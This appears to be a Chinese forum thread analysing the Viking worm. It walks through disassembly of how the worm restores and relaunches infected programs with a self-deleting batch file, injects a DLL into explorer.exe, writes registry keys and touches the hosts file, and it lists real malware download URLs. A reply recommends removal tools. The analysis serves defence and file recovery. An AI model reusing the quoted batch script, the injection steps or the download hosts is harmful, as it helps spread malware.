> 00408065    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
> 00408068    2945 F4         sub     dword ptr \[ebp-C\], eax  
> 0040806B    8B15 90294100   mov     edx, dword ptr \[412990\]  
> 00408071    8B4D F8         mov     ecx, dword ptr \[ebp-8\]  
> 00408074    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
> 00408077    E8 7CC8FFFF     call    004048F8                        ；跟进知道是写文件了  
> 0040807C    837D F4 00      cmp     dword ptr \[ebp-C\], 0  
> 00408080  ^\\77 BD           ja      short 0040803F  
> 00408082    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
> 00408085    50              push    eax  
> 00408086    E8 B1C1FFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
> //关闭文件句柄！  
> 0040808B    C645 CB 01      mov     byte ptr \[ebp-35\], 1  
> 0040808F    EB 04           jmp     short 00408095  
> 00408091    C645 CB 00      mov     byte ptr \[ebp-35\], 0  
> 00408095    6A 00           push    0                                ；从文件开始处  
> 00408097    6A 00           push    0  
> 00408099    A1 A0294100     mov     eax, dword ptr \[4129A0\]          ；E501 到 EAX  
> 0040809E    50              push    eax                              将文件指针移动到 E501  
> 0040809F    56              push    esi               
> 004080A0    E8 3FC3FFFF     call    004043E4                         ; jmp 到 kernel32.SetFilePointer  
> 004080A5    6A 00           push    0  
> 004080A7    8D45 F8         lea     eax, dword ptr \[ebp-8\]  
> 004080AA    50              push    eax  
> 004080AB    68 00000001     push    1000000                          ；读  
> 004080B0    A1 90294100     mov     eax, dword ptr \[412990\]          ；文  
> 004080B5    50              push    eax                              ；件  
> 004080B6    56              push    esi  
> 004080B7    E8 08C3FFFF     call    004043C4                         ; jmp 到 kernel32.ReadFile  
> 004080BC    837D F8 00      cmp     dword ptr \[ebp-8\], 0  
> 004080C0    74 12           je      short 004080D4  
> 004080C2    8B15 90294100   mov     edx, dword ptr \[412990\]  
> 004080C8    8B4D F8         mov     ecx, dword ptr \[ebp-8\]           ; \[EBP-8\]=文件大小-E501 吗？  
> 004080CB    8BC7            mov     eax, edi  
> 004080CD    E8 26C8FFFF     call    004048F8                         ；跟进就知道是将读到的内容写如文件，通过查看 hfile=64h 就  
>   
> 知道是写"C:\\Documents and  Settings\\huyuytyt\\",D7,"烂孳",B2,"",A1,"",B6,"拒 MdnPacker.exe.exe"，比原来的多了.exe  
> 004080D2  ^ EB D1           jmp     short 004080A5  
> 004080D4    8D45 CC         lea     eax, dword ptr \[ebp-34\]  
> 004080D4    8D45 CC         lea     eax, dword ptr \[ebp-34\]  
> 004080D7    50              push    eax  
> 004080D8    8D45 D4         lea     eax, dword ptr \[ebp-2C\]  
> 004080DB    50              push    eax  
> 004080DC    8D45 DC         lea     eax, dword ptr \[ebp-24\]  
> 004080DF    50              push    eax  
> 004080E0    57              push    edi  
> 004080E1    E8 06C3FFFF     call    004043EC                         ; jmp 到 kernel32.SetFileTime  
> //将文件时间设置回来  
> 004080E6    57              push    edi  
> 004080E7    E8 50C1FFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
> //关闭文件句柄  
> 004080EC    C685 C6FEFFFF 0>mov     byte ptr \[ebp-13A\], 0  
> 004080F3    8D85 C6FEFFFF   lea     eax, dword ptr \[ebp-13A\]  
> 004080F9    50              push    eax  
> 004080FA    68 04010000     push    104  
> 004080FF    E8 40C2FFFF     call    00404344                         ; jmp 到 kernel32.GetTempPathA  
> 00408104    C685 C1FDFFFF 0>mov     byte ptr \[ebp-23F\], 0  
> 0040810B    8D85 C1FDFFFF   lea     eax, dword ptr \[ebp-23F\]  
> 00408111    50              push    eax  
> 00408112    6A 00           push    0  
> 00408114    8D95 50FDFFFF   lea     edx, dword ptr \[ebp-2B0\]  
> 0040811A    B8 94834000     mov     eax, 00408394  
> 0040811F    E8 9CCBFFFF     call    00404CC0  
> 00408124    8B85 50FDFFFF   mov     eax, dword ptr \[ebp-2B0\]  
> 0040812A    E8 D9B3FFFF     call    00403508  
> 0040812F    50              push    eax  
> 00408130    8D85 C6FEFFFF   lea     eax, dword ptr \[ebp-13A\]  
> 00408136    50              push    eax  
> 00408137    E8 00C2FFFF     call    0040433C                         ; jmp 到 kernel32.GetTempFileNameA  
> 0040813C    8D95 4CFDFFFF   lea     edx, dword ptr \[ebp-2B4\]  
> 00408142    B8 A4834000     mov     eax, 004083A4                    ; ASCII "?狒"  
> 00408147    E8 74CBFFFF     call    00404CC0  
> 0040814C    8B85 4CFDFFFF   mov     eax, dword ptr \[ebp-2B4\]         ; 原来是.bat  
> 00408152    50              push    eax  
> 00408153    8D85 48FDFFFF   lea     eax, dword ptr \[ebp-2B8\]  
> 00408159    8D95 C1FDFFFF   lea     edx, dword ptr \[ebp-23F\]  
> 0040815F    B9 05010000     mov     ecx, 105  
> 00408164    E8 87B1FFFF     call    004032F0  
> 00408169    8B85 48FDFFFF   mov     eax, dword ptr \[ebp-2B8\]  
> 0040816F    8D4D E8         lea     ecx, dword ptr \[ebp-18\]  
> 00408172    5A              pop     edx  
> 00408173    E8 B4C7FFFF     call    0040492C                         ; 连接字符  
> 00408178    8B45 E8         mov     eax, dword ptr \[ebp-18\]  
> 0040817B    E8 88B3FFFF     call    00403508  
> 00408180    50              push    eax                              ; "C:\\DOCUME~1\\huyuytyt\\LOCALS~1\\Temp\\$$aBE.bat")  
> 00408181    E8 F6C0FFFF     call    0040427C                         ; jmp 到 kernel32.DeleteFileA  
> //先删掉，要不容易出错。  
> //下面开始写批处理了。。代码已经很长了就不贴了直接看内容  
> :try1  
> Del "C:\\Documents and Settings\\huyuytyt\\桌面\\病毒\\MdnPacker.exe"  
> if exist "C:\\Documents and Settings\\huyuytyt\\桌面\\病毒\\MdnPacker.exe" goto try1  
> ren "C:\\Documents and Settings\\huyuytyt\\桌面\\病毒\\MdnPacker.exe.exe" "MdnPacker.exe"  
> if exist "C:\\Documents and Settings\\huyuytyt\\桌面\\病毒\\MdnPacker.exe.exe" goto try2  
> "C:\\Documents and Settings\\huyuytyt\\桌面\\病毒\\MdnPacker.exe"  
> :try2  
> del "C:\\DOCUME~1\\huyuytyt\\LOCALS~1\\Temp\\$$a35.bat"  
> 就是试图删掉自身，将生成的文件重新命名回来，接着运行，最后删除批处理本身  
>   
> 00408272    E8 81C6FFFF     call    004048F8                         ; 将生成的内容写入批处理  
> 00408277    57              push    edi  
> 00408278    E8 BFBFFFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
>   
> 。。。。。。。。。。。。。。  
> 004082D9    50              push    eax  
> 004082DA    6A 00           push    0  
> 004082DC    6A 20           push    20  
> 004082DE    6A FF           push    -1  
> 004082E0    6A 00           push    0  
> 004082E2    6A 00           push    0  
> 004082E4    8B45 E8         mov     eax, dword ptr \[ebp-18\]  
> 004082E7    E8 1CB2FFFF     call    00403508  
> 004082EC    50              push    eax  
> 004082ED    6A 00           push    0  
> 004082EF    E8 78BFFFFF     call    0040426C                         ; jmp 到 kernel32.CreateProcessA  
> //运行这个批处理  
> 。。。。。。。。。。。  
> 0040830E    E8 C1600000     call    0040E3D4  
> {  
> 。。。。。。。。。。  
>   0040E41B    50              push    eax  
>   0040E41C    6A 00           push    0  
>   0040E41E    6A 00           push    0  
>   0040E420    6A 20           push    20  
>   0040E422    6A FF           push    -1  
>   0040E424    6A 00           push    0  
>   0040E426    6A 00           push    0  
>   0040E428    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
>   0040E42B    E8 D850FFFF     call    00403508  
>   0040E430    50              push    eax  
>   0040E431    6A 00           push    0  
>   0040E433    E8 345EFFFF     call    0040426C                         ; jmp 到 kernel32.CreateProcessA  
> //运行 Logo1\_.exe  
>   
> }  
>   
> 到这里，这个病毒基本上就分析完了。。。现在我们知道了 Logo1\_.exe 跟 rundl132.exe 是同一个程序，他们都是被感染程序的前 E501 字节写入  
>   
> 的。。  
> 下面我给出自己的恢复被感染程序编写的思路：  
> 1。查找所有的 EXE 文件  
> 2.将文件指针移动到 E501h 处，读取文件大小-E501 字节内容，写进文件"程序原来的名字+.exe"  
> 3.删除掉原来的程序  
> 4.将"程序原来的名字+.exe"重新命名为"程序原来的名字" 

> 那这个 Logo1\_.exe 到底做了什么坏事呢？我们继续跟踪。。。  
> 00408F4E    8B85 B4FEFFFF   mov     eax, dword ptr \[ebp-14C\]  
> 00408F54    E8 AFA5FFFF     call    00403508  
> \[ebp-14C\]=  
> http://down.down988.cn/a1.exe  
> http://down.down988.cn/a2.exe  
> http://down.down988.cn/a3.exe  
> http://down.down988.cn/a4.exe  
> http://down.down988.cn/a5.exe  
> http://down.down988.cn/a6.exe  
> http://down.down988.cn/a7.exe  
> http://down.down988.cn/a8.exe)  
> 是不是很可疑？？？  
>   
> 继续跟着 OD 走，  
> 。。。。。。。。。。。。  
> 00408FDF    E8 ACFBFFFF     call    00408B90                         ; 还记得这个 call 吗？关闭常见杀毒软件进程的  
>   
> 。。。。  
> 创建了三个线程！  
> 00408FF5    50              push    eax  
> 00408FF6    6A 00           push    0  
> 00408FF8    6A 00           push    0  
> 00408FFA    68 9CEE4000     push    0040EE9C                         ；线程 1  
> 00408FFF    6A 00           push    0  
> 00409001    6A 00           push    0  
> 00409003    E8 6CB2FFFF     call    00404274                         ; jmp 到 kernel32.CreateThread  
> 00409008    C605 D5F14100 0>mov     byte ptr \[41F1D5\], 1  
> 0040900F    A1 0C124100     mov     eax, dword ptr \[41120C\]  
> 00409014    F640 1C 01      test    byte ptr \[eax+1C\], 1  
> 00409018    74 27           je      short 00409041  
> 0040901A    68 30750000     push    7530  
> 0040901F    E8 E8B3FFFF     call    0040440C                         ; jmp 到 kernel32.Sleep  
> 00409024    C605 D5F14100 0>mov     byte ptr \[41F1D5\], 0  
> 0040902B    8D45 F8         lea     eax, dword ptr \[ebp-8\]  
> 0040902E    50              push    eax  
> 0040902F    6A 00           push    0  
> 00409031    6A 00           push    0  
> 00409033    68 40FB4000     push    0040FB40                         ；线程 2  
> 00409038    6A 00           push    0  
> 0040903A    6A 00           push    0  
> 0040903C    E8 33B2FFFF     call    00404274                         ; jmp 到 kernel32.CreateThread  
> 00409041    C605 D6F14100 0>mov     byte ptr \[41F1D6\], 1  
> 00409048    A1 0C124100     mov     eax, dword ptr \[41120C\]  
> 0040904D    F640 1C 02      test    byte ptr \[eax+1C\], 2  
> 00409051    0F84 A6000000   je      004090FD  
> 00409057    C605 D6F14100 0>mov     byte ptr \[41F1D6\], 0  
> 0040905E    8D45 F4         lea     eax, dword ptr \[ebp-C\]  
> 00409061    50              push    eax  
> 00409062    6A 00           push    0  
> 00409064    6A 00           push    0  
> 00409066    68 F0F84000     push    0040F8F0                         ；线程 3  
> 0040906B    6A 00           push    0  
> 0040906D    6A 00           push    0  
> 0040906F    E8 00B2FFFF     call    00404274                         ; jmp 到 kernel32.CreateThread  
>   
>   
>   
> 线程 1 的代码如下：  
> 0040EEBC    68 F4010000     push    1F4  
> 0040EEC1    E8 4655FFFF     call    0040440C                         ; jmp 到 kernel32.Sleep  
> 0040EEC6    8D55 FC         lea     edx, dword ptr \[ebp-4\]  
> 0040EEC9    B8 B8EF4000     mov     eax, 0040EFB8                    ; ASCII "潇毂"  
> 0040EECE    E8 ED5DFFFF     call    00404CC0  
> 0040EED3    8B45 FC         mov     eax, dword ptr \[ebp-4\]           ;  "dll1"  
> 0040EED6    50              push    eax  
> 0040EED7    8D55 F8         lea     edx, dword ptr \[ebp-8\]  
> 0040EEDA    B8 C8EF4000     mov     eax, 0040EFC8                    ; ASCII "潇?  
> 0040EEDF    E8 DC5DFFFF     call    00404CC0  
> 0040EEE4    8B45 F8         mov     eax, dword ptr \[ebp-8\]           ;  "dll"  
> 0040EEE7    8B0D D8F14100   mov     ecx, dword ptr \[41F1D8\]          ;  "C:\\WINDOWS\\RichDll.dll"  
> 0040EEED    5A              pop     edx                              ; dll  
> 0040EEEE    E8 95FEFFFF     call    0040ED88                         跟进  
> {  
>   0040EDFC    50              push    eax                              C:\\WINDOWS\\RichDll.dll"  
>   0040EDFD    E8 7A54FFFF     call    0040427C                         ; jmp 到 kernel32.DeleteFileA  
> //先删掉目标文件，要不下面的函数容易出错  
>   0040EE02    33C0            xor     eax, eax  
>   0040EE04    55              push    ebp  
>   0040EE05    68 56EE4000     push    0040EE56  
>   0040EE0A    64:FF30         push    dword ptr fs:\[eax\]  
>   0040EE0D    64:8920         mov     dword ptr fs:\[eax\], esp  
>   0040EE10    6A 00           push    0  
>   0040EE12    68 80000000     push    80  
>   0040EE17    6A 02           push    2  
>   0040EE19    6A 00           push    0  
>   0040EE1B    6A 00           push    0  
>   0040EE1D    68 000000C0     push    C0000000  
>   0040EE22    8B45 E4         mov     eax, dword ptr \[ebp-1C\]  
>   0040EE25    E8 DE46FFFF     call    00403508  
>   0040EE2A    50              push    eax                              ；C:\\WINDOWS\\RichDll.dll  
>   0040EE2B    E8 2C54FFFF     call    0040425C                         ; jmp 到 kernel32.CreateFileA  
> //创建 C:\\WINDOWS\\RichDll.dll  
>   0040EE30    8BD8            mov     ebx, eax  
>   0040EE32    6A 00           push    0  
>   0040EE34    8D45 E0         lea     eax, dword ptr \[ebp-20\]  
>   0040EE37    50              push    eax  
>   0040EE38    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
>   0040EE3B    50              push    eax  
>   0040EE3C    8B45 FC         mov     eax, dword ptr \[ebp-4\]  
>   0040EE3F    50              push    eax  
>   0040EE40    53              push    ebx  
>   0040EE41    E8 FE55FFFF     call    00404444                         ; jmp 到 kernel32.WriteFile  
> //写文件  
>   0040EE46    53              push    ebx  
>   0040EE47    E8 F053FFFF     call    0040423C                         ; jmp 到 kernel32.CloseHandle  
> //关闭文件句柄  
>   0040EE4C    33C0            xor     eax, eax  
>   0040EE4E    5A              pop     edx  
>   0040EE4F    59              pop     ecx  
>   0040EE50    59              pop     ecx  
>   0040EE51    64:8910         mov     dword ptr fs:\[eax\], edx  
>   0040EE54    EB 0A           jmp     short 0040EE60  
>   0040EE56  ^ E9 893CFFFF     jmp     00402AE4  
>   0040EE5B    E8 3C3EFFFF     call    00402C9C  
>   0040EE60    8B45 F0         mov     eax, dword ptr \[ebp-10\]  
>   0040EE63    E8 AC56FFFF     call    00404514  
>   0040EE68    8B45 F0         mov     eax, dword ptr \[ebp-10\]  
>   0040EE6B    50              push    eax  
>   0040EE6C    E8 6354FFFF     call    004042D4                         ; jmp 到 kernel32.FreeResource  
> //释放资源，原来又是以资源的形式。。。  
> }  
> 0040EEF3    A0 C4F14100     mov     al, byte ptr \[41F1C4\]  
> 0040EEF8    E8 CB61FFFF     call    004050C8                         ; 跟进发现又对"C:\\WINDOWS\\system32\\\\drivers\\etc\\hosts"这  
>   
> 个文件进行操作了，这个文件有什么妙处？  
> 0040EEFD    A1 D8F14100     mov     eax, dword ptr \[41F1D8\]  
> 0040EF02    E8 0146FFFF     call    00403508  
> 0040EF07    50              push    eax                              ;  "C:\\WINDOWS\\RichDll.dll"  
> 0040EF08    8D55 F4         lea     edx, dword ptr \[ebp-C\]  
> 0040EF0B    B8 D4EF4000     mov     eax, 0040EFD4                    ; ASCII "屮痨矧弪??"  
> 0040EF10    E8 AB5DFFFF     call    00404CC0  
> 0040EF15    8B45 F4         mov     eax, dword ptr \[ebp-C\]           ; "explorer.exe"  
> 0040EF18    E8 EB45FFFF     call    00403508  
> 0040EF1D    50              push    eax  
> 0040EF1E    8D55 F0         lea     edx, dword ptr \[ebp-10\]  
> 0040EF21    B8 ECEF4000     mov     eax, 0040EFEC                    ; ASCII "膳匦滔遗?嘏"  
> 0040EF26    E8 955DFFFF     call    00404CC0  
> 0040EF2B    8B45 F0         mov     eax, dword ptr \[ebp-10\]          ; "IEXPLORE.EXE"  
> 0040EF2E    E8 D545FFFF     call    00403508  
> 0040EF33    8BD0            mov     edx, eax  
> 0040EF35    33C0            xor     eax, eax  
> 0040EF37    59              pop     ecx  
> 0040EF38    E8 1376FFFF     call    00406550                         ;   
> //这个 CALL 比较重要，代码很多，但最主要的就是将 C:\\WINDOWS\\RichDll.dll 注入到 explorer.exe  
> //看上面的 IEXPLORE.EXE 有可能也被注入了哦，但我的机子上没有 IEXPLORE.EXE，刚删的！  
> 0040EF3D    84C0            test    al, al  
> 0040EF3F    74 3B           je      short 0040EF7C  
> 0040EF41    C605 D7F14100 0>mov     byte ptr \[41F1D7\], 1  
> 0040EF48    68 FCEF4000     push    0040EFFC  
> 0040EF4D    8D55 EC         lea     edx, dword ptr \[ebp-14\]  
> 0040EF50    B8 08F04000     mov     eax, 0040F008                    ; ASCII "狨麸"  
> 0040EF55    E8 665DFFFF     call    00404CC0  
> 0040EF5A    8B45 EC         mov     eax, dword ptr \[ebp-14\]          ;  "auto"  
> 0040EF5D    E8 A645FFFF     call    00403508  
> 0040EF62    50              push    eax  
> 0040EF63    A1 04124100     mov     eax, dword ptr \[411204\]  
> 0040EF68    8B00            mov     eax, dword ptr \[eax\]             ; "Software\\Soft\\DownloadWWW\\"  
> 0040EF6A    E8 9945FFFF     call    00403508  
> 0040EF6F    8BD0            mov     edx, eax  
> 0040EF71    B8 02000080     mov     eax, 80000002                    ；HKEY\_LOCAL\_MACHINE  
> 0040EF76    59              pop     ecx  
> 0040EF77    E8 3C60FFFF     call    00404FB8                         ; 写注册表  
> //打开你的注册表看看就知道了  
>   
> 线程 2 的代码如下：  
>   
>   
> 0040FB5C    E8 EFFDFFFF     call    0040F950                         ; 跟进知道是将获取的时间写进 C:\\\_desktop.ini  
> 0040FB61    84C0            test    al, al  
> //可以说是作为是否感染的标记  
> 0040FB63    74 79           je      short 0040FBDE  
> 0040FB65    C745 FC 5A00000>mov     dword ptr \[ebp-4\], 5A            \[EBP-4\]=Z  
> 0040FB6C    8D55 F4         lea     edx, dword ptr \[ebp-C\]  
> 0040FB6F    B8 1CFC4000     mov     eax, 0040FC1C  
> 0040FB74    E8 4751FFFF     call    00404CC0  
> 0040FB79    8B45 F4         mov     eax, dword ptr \[ebp-C\]  
> 0040FB7C    50              push    eax  
> 0040FB7D    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
> 0040FB80    8B55 FC         mov     edx, dword ptr \[ebp-4\]  
> 0040FB83    E8 2837FFFF     call    004032B0  
> 0040FB88    8B55 F0         mov     edx, dword ptr \[ebp-10\]  
> 0040FB8B    8D45 F8         lea     eax, dword ptr \[ebp-8\]  
> 0040FB8E    59              pop     ecx  
> 0040FB8F    E8 C037FFFF     call    00403354  
> 0040FB94    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
> 0040FB97    E8 6C39FFFF     call    00403508  
> 0040FB9C    50              push    eax  
> 0040FB9D    E8 5A47FFFF     call    004042FC                         ; jmp 到 kernel32.GetDriveTypeA  
> 0040FBA2    83F8 03         cmp     eax, 3                           判断是不是 DRIVE\_FIXED   
> 0040FBA5    75 2E           jnz     short 0040FBD5                   ；不是跳  
> 0040FBA7    33C0            xor     eax, eax  
> 0040FBA9    55              push    ebp  
> 0040FBAA    68 CBFB4000     push    0040FBCB  
> 0040FBAF    64:FF30         push    dword ptr fs:\[eax\]  
> 0040FBB2    64:8920         mov     dword ptr fs:\[eax\], esp  
> 0040FBB5    33C9            xor     ecx, ecx  
> 0040FBB7    33D2            xor     edx, edx  
> 0040FBB9    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
> 0040FBBC    E8 3F010000     call    0040FD00                        是固定盘就到这里面看看吧，感染所有的 EXE 文件代码都在这里面，有兴趣的自己跟吧，代码太长了，我自己都晕了  
> 0040FBC1    33C0            xor     eax, eax  
> 0040FBC3    5A              pop     edx  
> 0040FBC4    59              pop     ecx  
> 0040FBC5    59              pop     ecx  
> 0040FBC6    64:8910         mov     dword ptr fs:\[eax\], edx  
> 0040FBC9    EB 0A           jmp     short 0040FBD5  
> 0040FBCB  ^ E9 142FFFFF     jmp     00402AE4  
> 0040FBD0    E8 C730FFFF     call    00402C9C  
> 0040FBD5    FF4D FC         dec     dword ptr \[ebp-4\]               ；这里--  
> 0040FBD8    837D FC 42      cmp     dword ptr \[ebp-4\], 42           ；不等于 42，也就是 B，固定盘都是从 C 开始，循环  
> 0040FBDC  ^ 75 8E           jnz     short 0040FB6C  
>   
>   
> 上班时间到了，先去上班去，明天继续分析线程３．．这个线程３涉及 winsovk，线程１注入的 dll 很可能是下载者代码哦 

> 著名的威金类蠕虫病毒，发作后感染全盘的 exe 文件，并从网上自动下载大量的木马病毒流氓等，变种极多。  
>   
> 专杀工具也很多，给你推荐两个：  
>   
> 农夫的威金专杀：http://bbs.360safe.com/attachment.php?aid=5901  
>   
> http://www.chenoe.com/这个网站下载 Anti-Virus Tools (民间版 魏滔序) Version:1.1.0 - 070111.1  
>   
> 前面一个据说是目前最好的威金专杀，后面一个则胜在通杀所有变种，我自己使用过后面一个，还不错  
>   
>   
> 下载不了的话，去 360 的论坛看这个帖子：  
> http://bbs.360safe.com/viewthread.php?tid=13617&extra=page%3D1 

 4dd466d0e1e0cc123afbe504da2462ca